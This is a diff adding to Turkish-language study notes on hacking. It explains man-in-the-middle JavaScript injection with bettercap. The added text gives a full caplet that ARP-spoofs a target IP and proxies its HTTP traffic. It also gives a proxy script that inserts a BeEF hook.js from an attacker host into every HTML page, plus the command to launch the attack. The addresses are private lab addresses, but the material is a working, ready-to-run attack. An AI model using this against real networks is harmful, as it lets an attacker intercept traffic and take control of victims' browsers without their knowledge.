@@ -24,3 +24,48 @@ Nasıl çalışır?
 **_ JS Enjeksiyonu _**
 
 - Ortadaki adam saldırı ile js enjeksiyonu ile kurbanın girdiği web site önemsiz hacklenebilir.
+
+- bettercap kullanılır. Caplet oluşturulur. OLuşturulmuş caplet kullanılır.
+
+* Caplet : Bettercap içinde caplet, belirli komutları otomatik çalıştıran script dosyasıdır. Yani Bettercap’i her seferinde tek tek komut yazmadan çalıştırmanı sağlar.
+
+//
+
+> > beefcustom.cap
+
+> set arp.spoof.fullduplex true
+> set arp.spoof.targets 10.0.2.4 //hedef ip girilir
+> set http.proxy.script beefcustom.js
+> http.proxy on
+> sleep 1
+> arp.spoof on
+> ""
+
+//
+
+//
+
+> > beefcustom.js
+
+function onLoad() {
+log( "BeefInject loaded." );
+}
+
+function onResponse(req, res) {
+if( res.ContentType.indexOf('text/html') == 0 ){
+var body = res.ReadBody();
+if( body.indexOf('</head>') != -1 ) {
+log( "BeefInject loaded." );
+res.Body = body.replace(
+'</head>',
+'<script type="text/javascript" src="http://10.0.2.8:3000/hook.js"></script></head>'
+);
+}
+}
+}
+
+//
+
+- Bu dosyalar /usr/share/bettercap/caplets altına klasör halinde yapıştır bu iki dosyayı. Klasöre beefcustom ismi verilir (opsiyonel)
+
+> bettercap -iface eth0 -caplet /usr/share/bettercap/caplets/beefcustom/beefcustom.cap //tüm işlemleri yapar. http web sitelerinde deneyebilirisin.Kurban browser kullandığında Online browsers kısmında kurban görünür
